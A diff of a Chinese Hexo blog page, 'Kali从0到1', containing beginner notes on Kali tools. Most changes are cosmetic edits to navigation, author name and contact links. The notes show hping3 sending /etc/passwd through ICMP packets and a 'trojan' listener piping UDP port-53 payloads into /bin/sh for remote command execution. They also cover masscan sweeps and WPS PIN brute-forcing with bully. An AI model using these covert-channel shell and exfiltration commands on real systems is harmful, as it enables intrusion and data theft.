@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Kali从0到1, Jlan&#39;s Little World">
+    <meta name="keywords" content="Kali从0到1, J1an&#39;s Little World">
     <meta name="description" content="工具大全信息收集存活主机识别
 arping：
 
@@ -22,7 +22,7 @@ arping：
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Kali从0到1 | Jlan&#39;s Little World</title>
+    <title>Kali从0到1 | J1an&#39;s Little World</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -50,8 +50,6 @@ arping：
 
 
     
-        <link rel="stylesheet" type="text/css" href="/css/reward.css">
-    
 
 
 
@@ -69,7 +67,7 @@ arping：
                     
                     <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
-                    <span class="logo-span">Jlan&#39;s Little World</span>
+                    <span class="logo-span">J1an&#39;s Little World</span>
                 </a>
             </div>
             
@@ -90,55 +88,11 @@ arping：
   
   <li class="hide-on-med-and-down nav-item">
     
-    <a href="/tags" class="waves-effect waves-light">
-      
-      <i class="fas fa-tags" style="zoom: 0.6;"></i>
-      
-      <span>标签</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/categories" class="waves-effect waves-light">
-      
-      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
-      
-      <span>分类</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
     <a href="/archives" class="waves-effect waves-light">
       
       <i class="fas fa-archive" style="zoom: 0.6;"></i>
       
       <span>归档</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/about" class="waves-effect waves-light">
-      
-      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
-      
-      <span>关于</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/contact" class="waves-effect waves-light">
-      
-      <i class="fas fa-comments" style="zoom: 0.6;"></i>
-      
-      <span>留言板</span>
     </a>
     
   </li>
@@ -173,7 +127,7 @@ arping：
         
         <img src="/medias/logo.png" class="logo-img circle responsive-img">
         
-        <div class="logo-name">Jlan&#39;s Little World</div>
+        <div class="logo-name">J1an&#39;s Little World</div>
         <div class="logo-desc">
             
             Never really desperate, only the lost of the soul.
@@ -196,55 +150,11 @@ arping：
         
         <li class="m-nav-item">
 	  
-		<a href="/tags" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-tags"></i>
-			
-			标签
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/categories" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-bookmark"></i>
-			
-			分类
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
 		<a href="/archives" class="waves-effect waves-light">
 			
 			    <i class="fa-fw fas fa-archive"></i>
 			
 			归档
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/about" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-user-circle"></i>
-			
-			关于
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/contact" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-comments"></i>
-			
-			留言板
 		</a>
           
         </li>
@@ -396,6 +306,9 @@ arping：
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
 
         
 
@@ -416,13 +329,32 @@ arping：
 <li><p>与ping要等待某一主机连接超时或发回反馈信息不同，fping给一个主机发送完数据包后，马上给下一个主机发送数据包，实现多主机同时ping。如果某一主机ping通，则此主机将被打上标记，并从等待列表中移除，如果没ping通，说明主机无法到达，主机仍然留在等待列表中，等待后续操作。</p>
 </li>
 <li><p>```shell<br>fping IP1 IP2 IP3 …<br>fping -f filename<br>fping -g IP1 IP2<br>可以添加-a参数来只显示存活主机</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - ping的升级版（自己写歌脚本貌似也差不多）</span><br><span class="line"></span><br><span class="line">- **hping3**：</span><br><span class="line"></span><br><span class="line">  - hping是安全审计、防火墙测试等工作的标配工具。hping优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。</span><br><span class="line"></span><br><span class="line">  - 可以自己定制数据包来探测防火墙，也可以详细查看响应来判断拦截等内容，甚至可以用来伪造ICMP包来打DDOS</span><br><span class="line"></span><br><span class="line">  - ```</span><br><span class="line">    -a 指定包的请求IP，可以指定为目标来让自己反复ping自己，不过这样的话自己也就收不到响应数据了</span><br><span class="line">    -p 指定端口</span><br><span class="line">    -I 指定网卡</span><br><span class="line">    -c 指定发包次数</span><br></pre></td></tr></table></figure></li>
+<pre class="line-numbers language-none"><code class="language-none">
+  - ping的升级版（自己写歌脚本貌似也差不多）
+
+- **hping3**：
+
+  - hping是安全审计、防火墙测试等工作的标配工具。hping优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。
+
+  - 可以自己定制数据包来探测防火墙，也可以详细查看响应来判断拦截等内容，甚至可以用来伪造ICMP包来打DDOS
+
+  - &#96;&#96;&#96;
+    -a 指定包的请求IP，可以指定为目标来让自己反复ping自己，不过这样的话自己也就收不到响应数据了
+    -p 指定端口
+    -I 指定网卡
+    -c 指定发包次数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
 <li><p><strong>文件传输</strong></p>
 <ul>
 <li><p>Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务：</p>
 </li>
 <li><p>```shell<br>hping3 源IP –listen signature –safe  –icmp</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 监听ICMP包中的签名，根据签名解析出文件内容。</span><br><span class="line"></span><br><span class="line">- 在发送端使用签名打包的ICMP包发送文件：</span><br><span class="line"></span><br><span class="line">- ```shell</span><br><span class="line">  hping3 目标IP --icmp -d 100 --sign signature --file /etc/passwd</span><br></pre></td></tr></table></figure></li>
+<pre class="line-numbers language-none"><code class="language-none">
+- 监听ICMP包中的签名，根据签名解析出文件内容。
+
+- 在发送端使用签名打包的ICMP包发送文件：
+
+- &#96;&#96;&#96;shell
+  hping3 目标IP --icmp -d 100 --sign signature --file &#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
 <li><p>将<code>/etc/passwd</code>密码文件通过ICMP包传给目标主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。</p>
 </li>
 </ul>
@@ -436,7 +368,11 @@ arping：
 <li><p>在木马启动端：</p>
 </li>
 <li><p>```<br>hping3 192.168.10.66–listen signature –safe –udp -p 53 | /bin/sh</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 在远程控制端：</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  echo ls &gt;test.cmd hping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --file ./test.cmd</span><br></pre></td></tr></table></figure></li>
+<pre class="line-numbers language-none"><code class="language-none">
+- 在远程控制端：
+
+- &#96;&#96;&#96;
+  echo ls &gt;test.cmd hping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --file .&#x2F;test.cmd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
 <li><p>将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。</p>
 </li>
 <li><p>当然这里只是简单的演示程序，真实的场景，控制端可以利益shell执行很多的高级复杂的操作。</p>
@@ -452,7 +388,54 @@ arping：
 <li><p>又一个扫描工具，给个例子就过，好快啊</p>
 </li>
 <li><p>```<br>masscan -p80,8080-8100 10.0.0.0/8<br>（扫描10.x.x.x子网，扫描端口80和8000-8100范围的端口段）<br>可使用–echo把当前配置输出到文件，-c使用文件<br>–source-ip 指定源IP<br>–excludefile 文件 指定网段忽略<br>–max-rate 100000 最高发包速率<br>–banners 获取banner信息，支持少量的协议</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - md你快有个卵子用，扫不出来端口存活信息啊</span><br><span class="line"></span><br><span class="line">- **thcping6**：</span><br><span class="line"></span><br><span class="line">  - 针对IPV6的发包工具，隶属于atk6这个这个工具包下，官方描述是sends a hand crafted ping6 packet，就是手动构造一个ping6的数据包</span><br><span class="line">  - 学了IPV6再来</span><br><span class="line"></span><br><span class="line">### 路由分析</span><br><span class="line"></span><br><span class="line">- **netdiscover**：</span><br><span class="line">  </span><br><span class="line">  - 二层发现工具，拥有主动和被动发现两种方式，通过ARP路由表探测</span><br><span class="line">  - 最简单的就是直接输入netdiscover之后就是运行它的默认配置然后扫描局域网中所有的机器</span><br><span class="line">  - 也可以直接输入网卡让他自己跑两层</span><br><span class="line">  - 每天一个被打电话小技巧</span><br><span class="line">  </span><br><span class="line">- **netmask**：</span><br><span class="line"></span><br><span class="line">  - netmaks可以在 IP范围、子网掩码、cidr、cisco等格式中互相转换，并且提供了IP地址的点分十进制、16进制、8进制、2进制之间的互相转换</span><br><span class="line"></span><br><span class="line">  - ```</span><br><span class="line">    Usage: netmask spec [spec ...]</span><br><span class="line">      -h, --help                    Print a summary of the options</span><br><span class="line">      -v, --version                 Print the version number</span><br><span class="line">      -d, --debug                   Print status/progress information</span><br><span class="line">      -s, --standard                Output address/netmask pairs</span><br><span class="line">      -c, --cidr                    Output CIDR format address lists</span><br><span class="line">      -i, --cisco                   Output Cisco style address lists</span><br><span class="line">      -r, --range                   Output ip address ranges</span><br><span class="line">      -x, --hex                     Output address/netmask pairs in hex</span><br><span class="line">      -o, --octal                   Output address/netmask pairs in octal</span><br><span class="line">      -b, --binary                  Output address/netmask pairs in binary</span><br><span class="line">      -n, --nodns                   Disable DNS lookups for addresses</span><br><span class="line">      -f, --files                   Treat arguments as input files</span><br><span class="line">    Definitions:</span><br><span class="line">      a spec can be any of:</span><br><span class="line">        address</span><br><span class="line">        address:address</span><br><span class="line">        address:+address</span><br><span class="line">        address/mask</span><br><span class="line">      an address can be any of:</span><br><span class="line">        N           decimal number</span><br><span class="line">        0N          octal number</span><br><span class="line">        0xN         hex number</span><br><span class="line">        N.N.N.N     dotted quad</span><br><span class="line">        hostname    dns domain name</span><br><span class="line">      a mask is the number of bits set to one from the left</span><br></pre></td></tr></table></figure></li>
+<pre class="line-numbers language-none"><code class="language-none">
+  - md你快有个卵子用，扫不出来端口存活信息啊
+
+- **thcping6**：
+
+  - 针对IPV6的发包工具，隶属于atk6这个这个工具包下，官方描述是sends a hand crafted ping6 packet，就是手动构造一个ping6的数据包
+  - 学了IPV6再来
+
+### 路由分析
+
+- **netdiscover**：
+  
+  - 二层发现工具，拥有主动和被动发现两种方式，通过ARP路由表探测
+  - 最简单的就是直接输入netdiscover之后就是运行它的默认配置然后扫描局域网中所有的机器
+  - 也可以直接输入网卡让他自己跑两层
+  - 每天一个被打电话小技巧
+  
+- **netmask**：
+
+  - netmaks可以在 IP范围、子网掩码、cidr、cisco等格式中互相转换，并且提供了IP地址的点分十进制、16进制、8进制、2进制之间的互相转换
+
+  - &#96;&#96;&#96;
+    Usage: netmask spec [spec ...]
+      -h, --help                    Print a summary of the options
+      -v, --version                 Print the version number
+      -d, --debug                   Print status&#x2F;progress information
+      -s, --standard                Output address&#x2F;netmask pairs
+      -c, --cidr                    Output CIDR format address lists
+      -i, --cisco                   Output Cisco style address lists
+      -r, --range                   Output ip address ranges
+      -x, --hex                     Output address&#x2F;netmask pairs in hex
+      -o, --octal                   Output address&#x2F;netmask pairs in octal
+      -b, --binary                  Output address&#x2F;netmask pairs in binary
+      -n, --nodns                   Disable DNS lookups for addresses
+      -f, --files                   Treat arguments as input files
+    Definitions:
+      a spec can be any of:
+        address
+        address:address
+        address:+address
+        address&#x2F;mask
+      an address can be any of:
+        N           decimal number
+        0N          octal number
+        0xN         hex number
+        N.N.N.N     dotted quad
+        hostname    dns domain name
+      a mask is the number of bits set to one from the left<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
 <li><p>这个看官方文档吧</p>
 </li>
 </ul>
@@ -472,7 +455,45 @@ arping：
 </li>
 <li><p>```<br>-d    –domain                    要搜索的公司名称或域名。<br>-l    –limit                        限制搜索结果的数量，默认=500。<br>-S    –start                        从结果编号 X 开始，默认 = 0。<br>-g    –google-dork            使用 Google Dorks 进行 Google 搜索。<br>-p    –proxies                    对请求使用代理，在 proxies.yaml 中输入代理<br>-s    –shodan                    使用 Shodan 查询发现的主机。<br>–screenshot                    对已解析的域进行截图，指定输出目录：–screenshot output_directory<br>-v    –virtual-host        通过 DNS 解析验证主机名并搜索虚拟主机。<br>-e    –dns-server            用于查找的 DNS 服务器。<br>-f    –filename                将结果保存到 XML 和 JSON 文件。<br>-b    –source                    指定搜索的引擎和数据源</p>
 <p>#theHarvester -d [url] -l 300 -b [搜索引擎名称]</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - 没上一个自动化的好用，不开心😒</span><br><span class="line"></span><br><span class="line">## 漏洞分析</span><br><span class="line"></span><br><span class="line">### Fuzzing工具集</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Web程序</span><br><span class="line"></span><br><span class="line">## 数据库评估软件</span><br><span class="line"></span><br><span class="line">## 密码攻击</span><br><span class="line"></span><br><span class="line">## 无线攻击</span><br><span class="line"></span><br><span class="line">### 蓝牙工具集</span><br><span class="line"></span><br><span class="line">### 无线工具集</span><br><span class="line"></span><br><span class="line">- **bully**：</span><br><span class="line"></span><br><span class="line">  - Wi-Fi破解，通过爆破WPS模式下7位长度PIN值来获取Wi-Fi密码</span><br><span class="line"></span><br><span class="line">  - 使用方法</span><br><span class="line"></span><br><span class="line">  - ```shell</span><br><span class="line">    bully 监听模式网卡名 -b 目标BSSID -e 目标SSID -c 目标广播信道</span><br></pre></td></tr></table></figure></li>
+<pre class="line-numbers language-none"><code class="language-none">
+  - 没上一个自动化的好用，不开心😒
+
+## 漏洞分析
+
+### Fuzzing工具集
+
+
+
+
+
+
+
+
+
+
+
+
+
+## Web程序
+
+## 数据库评估软件
+
+## 密码攻击
+
+## 无线攻击
+
+### 蓝牙工具集
+
+### 无线工具集
+
+- **bully**：
+
+  - Wi-Fi破解，通过爆破WPS模式下7位长度PIN值来获取Wi-Fi密码
+
+  - 使用方法
+
+  - &#96;&#96;&#96;shell
+    bully 监听模式网卡名 -b 目标BSSID -e 目标SSID -c 目标广播信道<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
 <li><p>可以看到有许多参数，他们的获取方式我们会在后面提到</p>
 </li>
 <li><p>还没有试过，改天尝试一下</p>
@@ -505,7 +526,7 @@ arping：
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">Jlan</a>
+                    <a href="/about" rel="external nofollow noreferrer">J1an</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -528,7 +549,7 @@ arping：
                     本博客所有文章除特別声明外，均采用
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="/about" target="_blank">Jlan</a>
+                    <a href="/about" target="_blank">J1an</a>
                     !
                 </span>
             </div>
@@ -571,39 +592,6 @@ arping：
 
                 </div>
             </div>
-            
-                <div id="reward">
-    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
-
-    <!-- Modal Structure -->
-    <div id="rewardModal" class="modal">
-        <div class="modal-content">
-            <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">你的赏识是我前进的动力</h4>
-            <div class="reward-content">
-                <div class="reward-tabs">
-                    <ul class="tabs row">
-                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
-                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
-                    </ul>
-                    <div id="alipay">
-                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
-                    </div>
-                    <div id="wechat">
-                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-</div>
-
-<script>
-    $(function () {
-        $('.tabs').tabs();
-    });
-</script>
-
             
         </div>
     </div>
@@ -655,7 +643,7 @@ arping：
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            Jlan
+                            J1an
                             
                         </span>
                     </div>
@@ -700,7 +688,7 @@ arping：
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            Jlan
+                            J1an
                             
                         </span>
                     </div>
@@ -719,6 +707,9 @@ arping：
 <!-- 代码块功能依赖 -->
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
 
 
 <!-- 代码语言 -->
@@ -827,69 +818,15 @@ arping：
 
     <footer class="page-footer bg-color">
     
-        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
-<style>
-    .aplayer .aplayer-lrc p {
-        
-        display: none;
-        
-        font-size: 12px;
-        font-weight: 700;
-        line-height: 16px !important;
-    }
-
-    .aplayer .aplayer-lrc p.aplayer-lrc-current {
-        
-        display: none;
-        
-        font-size: 15px;
-        color: #42b983;
-    }
-
-    
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
-        left: -66px !important;
-    }
-
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
-        left: 0px !important;
-    }
-
-    
-</style>
-<div class="">
-    
-    <div class="row">
-        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
-                   server="netease"
-                   type="playlist"
-                   id="503838841"
-                   fixed='true'
-                   autoplay='false'
-                   theme='#42b983'
-                   loop='all'
-                   order='random'
-                   preload='auto'
-                   volume='0.7'
-                   list-folded='true'
-        >
-        </meting-js>
-    </div>
-</div>
-
-<script src="/libs/aplayer/APlayer.min.js"></script>
-<script src="/libs/aplayer/Meting.min.js"></script>
-
-    
 
     <div class="container row center-align"
          style="margin-bottom: 0px !important;">
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
-                <span id="year">2019-2022</span>
+                <span id="year">2022</span>
             
-            <a href="/about" target="_blank">Jlan</a>
+            <a href="/about" target="_blank">J1an</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
@@ -924,7 +861,7 @@ arping：
 
 
 
-    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <a href="mailto:jlan@icloud.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
         <i class="fas fa-envelope-open"></i>
     </a>
 
@@ -932,10 +869,8 @@ arping：
 
 
 
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
-        <i class="fab fa-qq"></i>
+    <a href="https://twitter.com/J1an45" class="tooltipped" target="_blank" data-tooltip="关注我的Twitter: https://twitter.com/J1an45" data-position="top" data-delay="50">
+        <i class="fab fa-twitter"></i>
     </a>
 
 
@@ -944,9 +879,7 @@ arping：
 
 
 
-    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
-        <i class="fas fa-rss"></i>
-    </a>
+
 
 </div>
     </div>
@@ -1106,6 +1039,14 @@ $(function () {
     
 
     <!-- 鼠标星星特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
+            }
+        </script>
     
 
      
@@ -1132,8 +1073,6 @@ $(function () {
     })();
 </script>
 
-    
-    <script src="/libs/others/clicklove.js" async="async"></script>
     
     
     <script async src="/libs/others/busuanzi.pure.mini.js"></script>
